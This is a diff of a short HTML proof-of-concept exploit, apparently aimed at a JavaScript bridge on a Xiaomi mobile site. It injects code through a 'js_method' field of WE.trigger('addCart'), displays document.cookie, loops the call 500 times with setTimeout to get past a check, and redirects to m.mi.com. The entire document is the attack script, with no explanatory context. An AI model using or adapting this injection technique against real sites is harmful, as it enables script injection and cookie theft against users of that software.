@@ -1,15 +1,15 @@
- <script>
-    function test(){
-       WE.trigger("addCart", '{"js_method":"if(document.domain.includes(\'mi\')){alert(document.cookie)}"}')
-    }
-   
-    function bypass(){
-    for(var i =0; i < 500; i++)
-    
-    { setTimeout(test, 10 + i); }
-    }
-    bypass();
-    location.href = "https://m.mi.com/"; 
-    
-</script>
+  <script>
+      function exp(){
+          var payload = 'if(document.domain.includes(\'mi\')){alert(document.cookie)}'
+          WE.trigger("addCart", JSON.stringify({js_method: payload}));
+      }
+
+      function bypass(){
+          for(var i = 0; i < 500; i++){
+              setTimeout(exp, 50 + i);
+          }
+      }
+      bypass();
+      location.href = "https://m.mi.com/"; 
+  </script>
 
